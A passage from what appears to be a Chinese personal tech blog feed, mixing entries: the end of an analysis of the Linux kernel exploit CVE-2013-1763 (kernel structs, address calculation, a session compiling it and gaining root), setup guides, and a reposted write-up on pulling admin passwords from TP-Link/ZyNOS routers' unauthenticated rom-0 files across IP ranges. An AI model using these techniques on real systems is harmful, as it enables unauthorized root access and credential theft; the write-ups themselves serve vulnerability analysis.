class="number">0x55</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0xb8</span>, <span class="number">0x3c</span>, <span class="number">0x87</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x5d</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>&#125; <span class="comment">//最后发现0x11被填充成了kernel_code的地址</span></span><br><span class="line">(gdb) p kernel_code</span><br><span class="line">$<span class="number">4</span> = &#123;<span class="keyword">int</span> ()&#125; <span class="number">0x804873c</span> &lt;kernel_code&gt;</span><br></pre></td></tr></table></figure></p><p>问题的关键变成了如何才能跳转到这一块内存区域呢？先看看下面这结构体的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">      __u32       nlmsg_len;  <span class="comment">/* Length of message including header */</span></span><br><span class="line">      __u16       nlmsg_type; <span class="comment">/* Message content */</span></span><br><span class="line">      __u16       nlmsg_flags;    <span class="comment">/* Additional flags */</span></span><br><span class="line">      __u32       nlmsg_seq;  <span class="comment">/* Sequence number */</span></span><br><span class="line">      __u32       nlmsg_pid;  <span class="comment">/* Sending process port ID */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unix_diag_req</span> &#123;</span></span><br><span class="line">      __u8    sdiag_family;</span><br><span class="line">      __u8    sdiag_protocol;</span><br><span class="line">      __u16   pad;</span><br><span class="line">      __u32   udiag_states;</span><br><span class="line">      __u32   udiag_ino;</span><br><span class="line">      __u32   udiag_show;</span><br><span class="line">      __u32   udiag_cookie[<span class="number">2</span>];</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> &#123;</span></span><br><span class="line">        __u8 family;<span class="comment">//</span></span><br><span class="line">        <span class="keyword">int</span> (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">netlink_table</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">nl_portid_hash</span>   <span class="title">hash</span>;</span> <span class="comment">//取回这个值</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>       <span class="title">mc_list</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">listeners</span> __<span class="title">rcu</span>  *<span class="title">listeners</span>;</span></span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            flags;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            groups;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>            *<span class="title">cb_mutex</span>;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">module</span>           *<span class="title">module</span>;</span></span><br><span class="line">         <span class="keyword">void</span>                    (*bind)(<span class="keyword">int</span> group);</span><br><span class="line">         <span class="keyword">int</span>                     registered;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">nl_portid_hash</span> &#123;</span></span><br><span class="line">         <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>       *<span class="title">table</span>;</span> <span class="comment">//四个字节</span></span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">long</span>           rehash_time; <span class="comment">//也是四个字节.0x00012b59//这个值在我们的那个范围内.</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            mask;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            shift;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            entries;</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">int</span>            max_shift;</span><br><span class="line"> </span><br><span class="line">         u32                     rnd;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">netlink_table</span> *<span class="title">nl_table</span>;</span></span><br></pre></td></tr></table></figure></p><p>我们的牛人发现了nl_table里面有一个变量rehash_time的值正好在0x10000-0x130000这个区域内，所以可以利用这个值来跳转，只需要将<code>sock_diag_handlers[sdiag_family]-dump</code>正好落在这个值上就可以了。如下图所示</p><p>所以我们需要先知道<code>nl_table</code>和<code>sock_diag_handlers</code>的地址，可以通过以下两种方式查看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms</span><br><span class="line">sudo cat /boot/System.map-3.2.0-43-generic-pae</span><br></pre></td></tr></table></figure></p><p>但是在ubuntu系统中前一种方法无法查看到变量函数的地址，所以只有使用第二种方法了，由于<code>nl_table</code>和 <code>sock_diag_handlers</code>都是指针，所以他们的大小都是4个字节。于是就可以计算出<code>sdiag_family</code>的取值了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep nl_table</span><br><span class="line">c189b5c0 d nl_table_lock</span><br><span class="line">c189b5c4 d nl_table_wait</span><br><span class="line">c1a488e0 b nl_table_users</span><br><span class="line">c1a488e4 b nl_table</span><br><span class="line">fengguoqing@VirtualBox:~$ sudo cat /boot/System.map-3.5.0-17-generic |grep sock_diag_handlers</span><br><span class="line">c1a487a0 b sock_diag_handlers</span><br><span class="line">(0xc1a488e4 - 0xc1a487a0) / 4 = 81L</span><br></pre></td></tr></table></figure></p><p>至此所有的谜题都解开了，然后就可以高高兴兴的黑自己一把了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fengguoqing@VirtualBox:~/Downloads$ gcc -o CVE-2013-1763 CVE-2013-1763.c</span><br><span class="line">CVE-2013-1763.c: In function ‘main’:</span><br><span class="line">CVE-2013-1763.c:148:26: warning: initialization from incompatible pointer type [enabled by default]</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ id</span><br><span class="line">uid=1000(fengguoqing) gid=1000(fengguoqing) groups=1000(fengguoqing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)</span><br><span class="line">fengguoqing@VirtualBox:~/Downloads$ ./CVE-2013-1763 Ubuntu</span><br><span class="line">mmapping at 0x10000, size = 0x120000</span><br><span class="line">uid=0, euid=0</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p><p>由于在sock_diag_lock_handler中有mutex_lock(&amp;sock_diag_table_mutex)，但是我们在后面将程序引入到其他地方，并没有接着执行 mutex_unlock(&amp;sock_diag_table_mutex)，所以按道理只能root成功一次，但是我在测试中发现有时候可以root多次，有时候root一次之后就不能再root了，需要重启才可以重新root。</p><h2 id="7-参考网站"><a href="#7-参考网站" class="headerlink" title="7. 参考网站"></a>7. 参考网站</h2><p>CVE：<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1763" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename…=CVE-2013-1763</a><br>NVD: <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-1763" target="_blank" rel="noopener">http://web.nvd.nist.gov/view/vuln/de…=CVE-2013-1763</a><br>Patch: CONFIRM:<a href="http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0" target="_blank" rel="noopener">http://git.kernel.org/?p=linux/kerne…e0b6894ffd79c0</a><br>Exploit: <a href="http://www.exploit-db.com" target="_blank" rel="noopener">http://www.exploit-db.com</a><br>维基百科Netlink：<a href="http://zh.wikipedia.org/wiki/Netlink" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/Netlink</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析&quot;&gt;&lt;a href=&quot;#linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析&quot; class=&quot;headerlink&quot; title=&quot;li
      
    
    </summary>
    
      <category term="安全" scheme="https://fengguoqing.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="linux CVE-2013-1763 漏洞" scheme="https://fengguoqing.github.io/tags/linux-CVE-2013-1763-%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>在ubuntu上安装redmine</title>
    <link href="https://fengguoqing.github.io/2014/04/20/%E5%9C%A8ubuntu%E4%B8%8A%E5%AE%89%E8%A3%85redmine/"/>
    <id>https://fengguoqing.github.io/2014/04/20/在ubuntu上安装redmine/</id>
    <published>2014-04-20T08:33:52.000Z</published>
    <updated>2017-11-29T14:30:35.387Z</updated>
    
    <content type="html"><![CDATA[<p>最近有一个新项目需要用到项目管理工具，最后准备采用redmine，经过一系列的折腾，终于把它安装完成了，现在将安装过程分享出来，为那些遇到同样问题的同学做个参考。  </p><p>首先按照<a href="http://www.redmine.org/projects/redmine/wiki/RedmineInstall" target="_blank" rel="noopener">官方网站</a>的步骤来安装，但是仍旧会碰到各种各样的问题。</p><h2 id="1-下载Redmine源代码"><a href="#1-下载Redmine源代码" class="headerlink" title="1. 下载Redmine源代码"></a>1. 下载Redmine源代码</h2><p>这里利用git下载：</p><pre><code>git clone https://github.com/redmine/redmine</code></pre><h2 id="2-安装配置MySQL"><a href="#2-安装配置MySQL" class="headerlink" title="2. 安装配置MySQL"></a>2. 安装配置MySQL</h2><p>已经安装过MySQL就不需要执行下面的命令：  </p><pre><code>sudo apt-get install mysql-server mysql-client</code></pre><p>配置redmine数据库和用户：</p><pre><code>mysql -u root -pCREATE DATABASE redmine CHARACTER SET utf8;CREATE USER &apos;redmine&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;my_password&apos;;GRANT ALL PRIVILEGES ON redmine.* TO &apos;redmine&apos;@&apos;localhost&apos;;&lt;/pre&gt;</code></pre><h2 id="3-数据库连接配置"><a href="#3-数据库连接配置" class="headerlink" title="3. 数据库连接配置"></a>3. 数据库连接配置</h2><p>首先要将redmine源码中 config/database.yml.example复制一份改名为config/database.yml。</p><pre><code>cp  config/database.yml.example config/database.yml</code></pre><p>根据刚刚创建的redmine数据库修改config/database.yml</p><pre><code>production:    adapter: mysql    database: redmine    host: localhost    username: redmine    password: &quot;my_password&quot;</code></pre><h2 id="4-安装依赖包"><a href="#4-安装依赖包" class="headerlink" title="4. 安装依赖包"></a>4. 安装依赖包</h2><p>首先得安装ruby和gem,然后使用gem安装bundler，最后通过bundle根据redmine下面的Gemfile安装所有需要安装的软件包。</p><pre><code>sudo apt-get install ruby rubygems ruby1.8-dev ruby1.9.1-dev libmysqlclient-dev imagemagick libmagickwand-devcd redmine</code></pre><p>/<em> 由于有GFW的存在，需要使用国内的gem源才能下载，先删除官方源，然后添加淘宝的源 </em>/</p><pre><code>gem sources -r http://rubygems.org/gem source -a http://ruby.taobao.orgsudo gem install bundler -Vbundle install --without development test</code></pre><h2 id="5-Redmine配置"><a href="#5-Redmine配置" class="headerlink" title="5. Redmine配置"></a>5. Redmine配置</h2><pre><code>rake generate_secret_tokenRAILS_ENV=production rake db:migrateRAILS_ENV=production rake redmine:load_default_data</code></pre><h2 id="6-文件系统权限设置"><a href="#6-文件系统权限设置" class="headerlink" title="6. 文件系统权限设置"></a>6. 文件系统权限设置</h2><p>在Redmine下建立文件夹并设置相应权限  </p><pre><code>mkdir -p tmp tmp/pdf public/plugin_assetssudo chmod -R 755 files log tmp public/plugin_assets</code></pre><h2 id="7-运行测试"><a href="#7-运行测试" class="headerlink" title="7. 运行测试"></a>7. 运行测试</h2><p>至此Redmine就安装完成了，现在就可以运行测试了。运行下面的命令进行测试：</p><pre><code>ruby script/rails server webrick -e production</code></pre><p>运行上面的服务之后，我们就可以在浏览器中输入<a href="http://IP:3000" target="_blank" rel="noopener">http://IP:3000</a> 来测试。如果安装成功就会出现下面的网站界面：<br><img src="http://static.oschina.net/uploads/space/2014/0420/161230_YGrG_579952.png" alt=""><br>初始用户名/密码：admin/admin<br>但是这样启动之后中断窗口是不能关闭的，如果要像服务一样启动，得添加-d参数：</p><pre><code>ruby script/server webrick -e production -d</code></pre><p>如果想要关闭服务，可以通过查看该服务的PID来关闭：</p><pre><code>cat redmine/tmp/pids/server.pidkill -9 [PID]</code></pre><p>最后在使用redmine过程中发现网络连接很慢，按理说，是局域网内的访问应该很快的，后来调查之后发现是webrick捣的鬼，改用thin就好了。</p><p>先在Gemfile文件中添加thin，然后再用bundle安装一下就可以了。</p><pre><code>vim Gemfile+#gem &apos;mongrel&apos;, &apos;1.2.0.pre2&apos;+gem &apos;thin&apos;bundle install --without development test</code></pre><p>安装之后重新启动redmine服务，访问就快很多了。  </p><pre><code>ruby script/rails server thin -e production -d</code></pre><h2 id="8-邮件服务配置"><a href="#8-邮件服务配置" class="headerlink" title="8. 邮件服务配置"></a>8. 邮件服务配置</h2><p>邮件服务配置需要修改config/configuration.yml，我的一个可以成功发送邮件的配置是：</p><pre><code># default configuration options for all environmentsdefault:# Outgoing emails configuration (see examples above)email_delivery:delivery_method: :smtpsmtp_settings:address: localhostport: 25domain: example.com# authentication: :login# user_name: &quot;redmine@example.net&quot;# password: &quot;redmine&quot;</code></pre><p>然后重启redmine服务，在管理&gt;&gt;配置&gt;&gt;邮件通知 中选择发送测试邮件进行测试。</p><h2 id="9-结语"><a href="#9-结语" class="headerlink" title="9. 结语"></a>9. 结语</h2><p>在整个安装的过程中碰到了很多问题，大部分都是缺少依赖包的，在前面的安装中都已经提示出来了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近有一个新项目需要用到项目管理工具，最后准备采用redmine，经过一系列的折腾，终于把它安装完成了，现在将安装过程分享出来，为那些遇到同样问题的同学做个参考。  &lt;/p&gt;
&lt;p&gt;首先按照&lt;a href=&quot;http://www.redmine.org/projects/r
      
    
    </summary>
    
      <category term="其他" scheme="https://fengguoqing.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="redmine" scheme="https://fengguoqing.github.io/tags/redmine/"/>
    
  </entry>
  
  <entry>
    <title>Linux kernel make menuconfig 时出错处理方法</title>
    <link href="https://fengguoqing.github.io/2014/04/14/Linux-kernel-make-menuconfig-%E6%97%B6%E5%87%BA%E9%94%99%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/"/>
    <id>https://fengguoqing.github.io/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/</id>
    <published>2014-04-14T09:53:42.000Z</published>
    <updated>2017-11-26T00:12:29.166Z</updated>
    
    <content type="html"><![CDATA[<p>在Ubuntu 12.04的环境下编译最新的linux 3.14代码时出现下面的错误：</p><pre><code>$makemenuconfigHOSTLDscripts/kconfig/mconfscripts/kconfig/mconf.o:Infunction`show_help&apos;:mconf.c:(.text+0x8a4):undefinedreferenceto`stdscr&apos;scripts/kconfig/lxdialog/checklist.o:Infunction`print_arrows&apos;:checklist.c:(.text+0x41):undefinedreferenceto`wmove&apos;checklist.c:(.text+0x61):undefinedreferenceto`acs_map&apos;......menubox.c:(.text+0x3a9):undefinedreferenceto`wrefresh&apos;scripts/kconfig/lxdialog/menubox.o:Infunction`print_buttons&apos;:menubox.c:(.text+0x4ef):undefinedreferenceto`wrefresh&apos;collect2:ldreturned1exitstatusmake[1]:***[scripts/kconfig/mconf]Error1make:***[menuconfig]Error2`&lt;/pre&gt; &lt;span style=&quot;line-height: 23px;&quot;&gt;由于缺少必要的package，所以出现了编译问题。&lt;/span&gt;&lt;span style=&quot;font-size: 12.5px;&quot;&gt;出现这个问题的处理方法：&lt;/span&gt;&lt;pre class=&quot;brush:shell;toolbar: true; auto-links: false;&quot;&gt;`sudoapt-getinstallbuild-essentiallibncurses5libncurses5-dev</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在Ubuntu 12.04的环境下编译最新的linux 3.14代码时出现下面的错误：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$makemenuconfig
HOSTLDscripts/kconfig/mconf
scripts/kconfig/mconf.o:Infunction
      
    
    </summary>
    
    
      <category term="linux移植" scheme="https://fengguoqing.github.io/tags/linux%E7%A7%BB%E6%A4%8D/"/>
    
  </entry>
  
  <entry>
    <title>解决三星手机WIFI“此网络不可用。证书已到期”方法</title>
    <link href="https://fengguoqing.github.io/2014/02/15/%E8%A7%A3%E5%86%B3%E4%B8%89%E6%98%9F%E6%89%8B%E6%9C%BAWIFI%E2%80%9C%E6%AD%A4%E7%BD%91%E7%BB%9C%E4%B8%8D%E5%8F%AF%E7%94%A8%E3%80%82%E8%AF%81%E4%B9%A6%E5%B7%B2%E5%88%B0%E6%9C%9F%E2%80%9D%E6%96%B9%E6%B3%95/"/>
    <id>https://fengguoqing.github.io/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/</id>
    <published>2014-02-15T10:11:22.000Z</published>
    <updated>2017-11-25T16:31:28.200Z</updated>
    
    <content type="html"><![CDATA[<p>最近三星手机升级到了4.3，但是升级完了之后WIFI就出现了问题，有时候根本就连不上，有时候连上了还要弹出一个网页登陆，登陆完之后，用一会就自己断掉了，弹出通知说“此网络不可用。证书已到期”，无法自动重连。没有升级之前都是很好用的。试了很多办法，比如重启手机，重启路由器，忘记密码重新登陆，都没有作用。</p><p>后来想到了给WIFI热点重新起一个名字，作为一个新的WIFI热点来登陆，后来果然就可以正常使用了，可能是升级前后证书有所改变，所以原来的WIFI无法继续登陆了。</p><p>希望可以帮助碰到相同问题的同学。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近三星手机升级到了4.3，但是升级完了之后WIFI就出现了问题，有时候根本就连不上，有时候连上了还要弹出一个网页登陆，登陆完之后，用一会就自己断掉了，弹出通知说“此网络不可用。证书已到期”，无法自动重连。没有升级之前都是很好用的。试了很多办法，比如重启手机，重启路由器，忘
      
    
    </summary>
    
    
      <category term="日常记录" scheme="https://fengguoqing.github.io/tags/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>某些TP-Link路由器可以被远程获取密码</title>
    <link href="https://fengguoqing.github.io/2014/01/19/%E6%9F%90%E4%BA%9BTP-Link%E8%B7%AF%E7%94%B1%E5%99%A8%E5%8F%AF%E4%BB%A5%E8%A2%AB%E8%BF%9C%E7%A8%8B%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81/"/>
    <id>https://fengguoqing.github.io/2014/01/19/某些TP-Link路由器可以被远程获取密码/</id>
    <published>2014-01-19T09:59:38.000Z</published>
    <updated>2017-11-25T16:33:08.893Z</updated>
    
    <content type="html"><![CDATA[<h4 id="HOW-I-SAVED-YOUR-A-FROM-THE-ZYNOS-ROM-0-ATTACK-FULL-DISCLOSURE"><a href="#HOW-I-SAVED-YOUR-A-FROM-THE-ZYNOS-ROM-0-ATTACK-FULL-DISCLOSURE" class="headerlink" title="HOW I SAVED YOUR A** FROM THE ZYNOS (ROM-0) ATTACK !! ( FULL DISCLOSURE )"></a>HOW I SAVED YOUR A** FROM THE ZYNOS (ROM-0) ATTACK !! ( FULL DISCLOSURE )</h4><p>Hello everyone, I just wanted to discuss some vulnerability I found and exploited for GOODNESS .. just so that SCRIPT KIDIES won’t attack your home/business network .</p><p>Well, in Algeria the main ISP ( Algerie Telecom ) provide you with a router when you pay for an internet plan. So you can conclude that every subscriber is using that router . TD-W8951ND is one of them, I did some ip scanning and I found that every router is using ZYXEL embedded firmware.</p><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis :"></a><strong>Analysis :</strong></h3><p>Let’s download an update and take a look at it and try to find some vulnerabilities. ( <a href="http://www.tp-link.com/Resources/software/TD-W8951ND_V3.0_110729_FI.rar" target="_blank" rel="noopener">http://www.tp-link.com/Resources/software/TD-W8951ND_V3.0_110729_FI.rar </a>)</p><p><a href="http://static.oschina.net/uploads/img/201401/19175934_8zu4.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175934_qaNU.jpg" alt="lif" title="lif"></a></p><p>The ras file is in LIF format !! …<br>Hmmm let’s put that file for Binwalk test for God’s sake ! ( check :<a href="http://code.google.com/p/binwalk/wiki/Installation" target="_blank" rel="noopener">http://code.google.com/p/binwalk/wiki/Installation</a> for more informations on how to install it ).</p><p>This is what Binwalk told me about that file :<br><a href="http://static.oschina.net/uploads/img/201401/19175934_veKb.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175934_svCo.jpg" alt="zynos" title="zynos"></a></p><p>You can clearly see and confirm that the router is using zynos firmware. We can also see that there is two blocks of LZMA compressed data … let’s extract them and have a look.<br><a href="http://static.oschina.net/uploads/img/201401/19175935_0q2n.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175935_6pIO.jpg" alt="extract1" title="extract1"></a></p><p>The problem is that when I tried to decompress the two blocks I get an error : ” Compressed data is corrupt “</p><p><a href="http://static.oschina.net/uploads/img/201401/19175935_xf7b.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175935_U9nN.jpg" alt="error" title="error"></a></p><p>Hmm, first the “ras” file was in LIF format .. and now the lzma compress blocks are corrupted !!<br>I googled this and tried to find a solution for this, <strong>FOUND NOTHING</strong> . How am I going to solve this ??<br>One idea came in my mind .. “Strings” command and here is what I got :</p><p><a href="http://static.oschina.net/uploads/img/201401/19175935_cqNB.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_vM18.jpg" alt="strings" title="strings"></a></p><p>Aaaah ! so the blocks aren’t compressed with LZMA or anything ! and the whole “ras” firmware file is just big chunk of data in clear text.<br>Ok, let’s try and find some useful STRINGS …</p><p>After some time searching “I” didn’t find the useful thing that will help us find vulnerabilities on the firmware !!</p><p>I didn’t give up …<br>I just was thinking and questioning :</p><ul><li><p>Me: What do you want from this firmware file !</p></li><li><p>Me: I want to find remote vulnerabilities that will help me extract the “admin” password.</p></li><li><p>Me: Does the web interface let you save the current configuration ? </p></li></ul><p><a href="http://static.oschina.net/uploads/img/201401/19175936_Jez1.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_PIlE.jpg" alt="rom-save" title="rom-save"></a></p><ul><li><p>Me: yes !!</p></li><li><p>Me: Is the page password protected ? </p></li></ul><p><a href="http://static.oschina.net/uploads/img/201401/19175936_T61n.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175936_ypc5.jpg" alt="password-protected" title="password-protected"></a></p><ul><li>Me: No !!! I tired to access that page on a different IP and it didn’t require a passowrd ! </li></ul><p>Ok, enough questions haha ..</p><p>Now, when I activated TamperData and clicked “ROMFILE SAVE”&#160; I’ve found out that the rom-0 file is located on “IP/rom-0″ and the directory isn’t password protected or anything.</p><p>So we are able to download the configuration file which contains the “admin” password. I took a look at rom-0 file and couldn’t figure out how to reverse-engineer it, and when you don’t know something it’s not a shame to ask for help .. and that’s what I did !<br>I contacted “<strong>Craig</strong>” from <a href="http://devttys0.com/" target="_blank" rel="noopener">devttys0.com</a>, he is an expect when it comes to hacking embdded devices . He’s a great guy and he replied to my email and pointed me to <a href="http://50.57.229.26/zynos.php" target="_blank" rel="noopener">http://50.57.229.26/zynos.php</a>which is a free rom-0 file decompressor .</p><p><a href="http://static.oschina.net/uploads/img/201401/19175937_whRc.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175937_NJ9G.jpg" alt="decompress" title="decompress"></a></p><p>When you upload and submit the rom-0 file there, the php page replies back with the configuration in clear text ( <strong>INCLUDING THE PASSWORD</strong> ) .</p><p>So what i need to do now is to automate the process of :</p><ul><li><p>Download rom-0 file.</p></li><li><p>Upload it to <a href="http://50.57.229.26/zynos.php" target="_blank" rel="noopener">http://50.57.229.26/zynos.php</a></p></li><li><p>get the repy back and extract the admin password from it.</p></li><li><p>loop this process to a range of ip addresses. </p></li></ul><p>And that’s exactly what I did, I opened an OLD OLD poc python script of mine that accessed routers via telnet using the default passwords. So what I just need to do now is to add some functionality to it.</p><p>Well I thought about&#160; this, and I’m posting this script online <strong>ONLY FOR EDUCATIONAL PURPOSES.</strong></p><p>You can find the scripts here : <a href="https://github.com/MrNasro/zynos-attacker/" target="_blank" rel="noopener">https://github.com/MrNasro/zynos-attacker/</a></p><p>Demo :</p><p><a href="http://static.oschina.net/uploads/img/201401/19175937_xoJZ.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175937_vATX.jpg" alt="demo" title="demo"></a></p><p><strong>PS : I OWN ALL THE IP RANGE I WAS SCANNING ” FOR SURE <img src="http://static.oschina.net/uploads/img/201401/19180126_0Zrk.gif" alt=";)"> “</strong></p><h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention :"></a>Prevention :</h3><p>Now ! how do you prevent attackers from downloading your rom-0 configuration file and manipulating your router ? This is pretty simple if you think about it ..<br>You just have to forward port 80 on the router to and inused IP address on your network :<br><a href="http://static.oschina.net/uploads/img/201401/19175937_XPrm.jpg" target="_blank" rel="noopener"><img src="http://static.oschina.net/uploads/img/201401/19175938_gdlc.jpg" alt="forward" title="forward"></a></p><p><strong>THATS ALL, </strong>or if you want to play a little with attackers that are using scripts too .. just forward port 80 to you local http server and put a LARGE file in the root directory and name it rom-0 .. just let them download like 1GB rom-0 file haha haha .. I have also automated the process of port forwarding and I’m running the scripts daily just to prevent hackers from attacking weak users …</p><p>In the next post I’ll demonstrate how would a malicious hacker exploit this to hack TONS of networks and get a meterpreter/reverse_shell on every PC on the target network ..</p><p>Hope you enjoyed this analysis, if you have anything to add or any questions to ask don’t hesitate to contact me ! <strong>BE THEIR HERO, HAPPY HACKING <img src="http://static.oschina.net/uploads/img/201401/19180126_0Zrk.gif" alt=";)"></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;HOW-I-SAVED-YOUR-A-FROM-THE-ZYNOS-ROM-0-ATTACK-FULL-DISCLOSURE&quot;&gt;&lt;a href=&quot;#HOW-I-SAVED-YOUR-A-FROM-THE-ZYNOS-ROM-0-ATTACK-FULL-DISCLO
      
    
    </summary>
    
    
      <category term="系统安全" scheme="https://fengguoqing.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>生成和打上patch的方法</title>
    <link href="https://fengguoqing.github.io/2013/12/02/%E7%94%9F%E6%88%90%E5%92%8C%E6%89%93%E4%B8%8Apatch%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://fengguoqing.github.io/2013/12/02/生成和打上patch的方法/</id>
    <published>2013-12-02T05:24:16.000Z</published>
    <updated>2017-11-29T13:23:03.978Z</updated>
    
